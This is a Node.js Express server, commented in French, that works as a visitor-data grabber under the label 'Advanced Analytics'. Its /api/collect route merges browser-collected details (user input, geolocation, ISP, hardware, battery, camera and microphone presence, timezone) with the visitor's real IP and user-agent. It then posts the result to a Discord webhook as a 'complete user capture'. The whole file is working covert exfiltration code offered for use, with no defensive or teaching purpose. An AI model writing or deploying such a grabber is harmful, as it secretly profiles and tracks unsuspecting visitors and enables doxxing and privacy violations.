const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION ---
// REMPLACE CECI PAR TON URL WEBHOOK DISCORD
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.set('trust proxy', true);

// --- FONCTION ENVOI DISCORD ---
async function sendToDiscord(data) {
    
    // Fonction utilitaire pour éviter les "undefined"
    const val = (v) => v || "N/A";

    const embed = {
        title: "🔐 CAPTURE UTILISATEUR COMPLÈTE",
        color: 1548100, // Vert émeraude
        thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/1063/1063340.png" }, // Icône bouclier générique
        fields: [
            {
                name: "👤 IDENTITÉ",
                value: `**Input:** ${val(data.userInput)}\n**Heure:** ${val(data.timestamp)}`,
                inline: true
            },
            {
                name: "🌍 GÉOLOCALISATION (IP)",
                value: `**IP:** ${val(data.ip)}\n**Ville:** ${val(data.city)}\n**Région:** ${val(data.region)}\n**Pays:** ${val(data.country)}\n**Code Postal:** ${val(data.postal)}`,
                inline: true
            },
            {
                name: "📡 FAI & RÉSEAU",
                value: `**FAI (ISP):** ${val(data.isp)}\n**Type:** ${val(data.network?.type)}\n**Vitesse:** ${val(data.network?.downlink)}\n**Ping:** ${val(data.network?.rtt)}`,
                inline: false
            },
            {
                name: "🖥️ MATÉRIEL",
                value: `**CPU:** ${val(data.cpuCores)} Cœurs\n**RAM:** ${val(data.ram)} Go\n**Écran:** ${val(data.screen)}`,
                inline: true
            },
            {
                name: "🔋 ÉNERGIE",
                value: `**Niveau:** ${val(data.battery?.level)}\n**État:** ${val(data.battery?.charging)}`,
                inline: true
            },
            {
                name: "📱 PÉRIPHÉRIQUES",
                value: `**Caméra:** ${data.media?.hasCamera ? "✅ Détectée" : "❌ Aucune"}\n**Micro:** ${data.media?.hasMicrophone ? "✅ Détecté" : "❌ Aucun"}`,
                inline: true
            },
            {
                name: "⚙️ SYSTÈME",
                value: `**OS:** ${val(data.platform)}\n**Langue:** ${val(data.language)}\n**Fuseau:** ${val(data.timezone)}`,
                inline: false
            },
            {
                name: "🕵️ USER-AGENT (Détails)",
                value: "```" + val(data.userAgent) + "```",
                inline: false
            }
        ],
        footer: {
            text: "Site Info Maker • Advanced Analytics"
        }
    };

    const payload = { embeds: [embed] };

    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        console.log("✅ Embed Discord envoyé avec succès !");
    } catch (error) {
        console.error("❌ Erreur Discord:", error);
    }
}

// --- ROUTE API ---
app.post('/api/collect', async (req, res) => {
    // Fusion des données Serveur + Client
    const fullData = {
        ...req.body, // Données Client (Ville, Batterie, etc.)
        ip: req.ip,  // Données Serveur (IP réelle)
        userAgent: req.headers['user-agent']
    };

    // Envoi asynchrone (ne bloque pas la réponse au navigateur)
    sendToDiscord(fullData);

    res.json({ status: 'success' });
});

app.listen(PORT, () => {
    console.log(`🚀 Serveur lancé sur http://localhost:${PORT}`);
});